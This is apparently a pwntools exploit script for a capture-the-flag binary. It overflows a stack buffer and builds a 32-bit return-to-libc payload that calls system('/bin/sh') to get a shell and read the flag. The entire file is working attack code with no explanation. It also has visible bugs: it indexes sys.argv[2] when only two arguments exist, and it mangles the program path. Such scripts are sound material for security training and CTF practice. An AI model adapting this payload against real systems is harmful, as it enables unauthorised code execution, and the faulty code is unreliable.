#!/usr/bin/env python
from pwn import *
import helpers
import pwn
import sys
import os

########################################################
# Setup                                                #
########################################################
# get executable and store it in a variable
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[4:]

binary = ELF(prog)                            # load bin into pwn
proc = process(prog, setuid=False)            # prevent effects to
                                              # target bin
context.binary = binary
context.terminal = ['tmux', 'splitw']         # horizontal split
#context.terminal = ['tmux', 'splitw', '-h']  # vertical split

# setup for debugging
#io = gdb.debug([binary.path], gdbscript='''
#                    b *main
#                    c
#                    ''')

# setup for gdb attach
#io = gdb.attach(proc, gdbscript='b *main')

# crashes program for corefile
os.system('rm core')
proc.sendline(cyclic(500))
proc.wait()
core = Core('./core')

########################################################
# Exploit                                              #
########################################################
# get system addr for payload
system = proc.libc.functions['system'].address
sh = core.libc.find(b'/bin/sh')
exit = proc.libc.functions['exit'].address

# construct payload
payload = b''.join([cyclic(140),
                    p32(system),
                    p32(exit),
                    p32(sh),
                    ])

########################################################
# Execution                                            #
########################################################
# use for debugging or gdb attach
#proc = process(prog)
#proc.sendline(payload) 
#proc.sendline('cat flag') 
#proc.interactive()

# get flag
flag = helpers.get_flag(binary, payload)
pwn.info(f'Flag: {flag}')
